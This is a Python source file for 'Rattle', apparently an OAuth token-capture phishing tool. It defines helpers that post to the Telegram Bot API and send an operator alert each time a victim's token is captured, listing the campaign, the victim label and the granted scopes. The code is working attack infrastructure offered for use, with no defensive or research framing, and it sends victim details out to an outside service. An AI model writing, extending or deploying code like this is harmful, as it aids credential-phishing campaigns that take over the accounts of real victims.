"""
Telegram notifications for Rattle.
Sends a message through the Telegram Bot API whenever a token is captured.
Pure standard library + requests, no frameworks, safe to import anywhere.
"""

import logging

import requests

log = logging.getLogger("rattle.notifier")

TELEGRAM_API = "https://api.telegram.org/bot{token}/sendMessage"


def send_telegram(bot_token: str, chat_id: str, message: str) -> bool:
    """Send a message via the Telegram Bot API. Returns True on success."""
    if not bot_token or not chat_id:
        log.warning("Telegram not configured; skipping notification")
        return False
    try:
        resp = requests.post(
            TELEGRAM_API.format(token=bot_token),
            json={"chat_id": chat_id, "text": message, "parse_mode": "HTML"},
            timeout=10,
        )
        if resp.status_code == 200:
            return True
        log.error(
            "Telegram send failed: %s %s", resp.status_code, resp.text[:300]
        )
        return False
    except requests.RequestException:
        log.exception("Telegram send error")
        return False


def notify_new_token(bot_token, chat_id, campaign_name, victim_label, scopes):
    """Fire a Telegram alert when a new OAuth token is captured."""
    msg = (
        "&#127919; <b>Rattle capture</b>\n"
        f"Campaign: <b>{campaign_name}</b>\n"
        f"Target: {victim_label}\n"
        f"Scopes: {scopes}"
    )
    return send_telegram(bot_token, chat_id, msg)
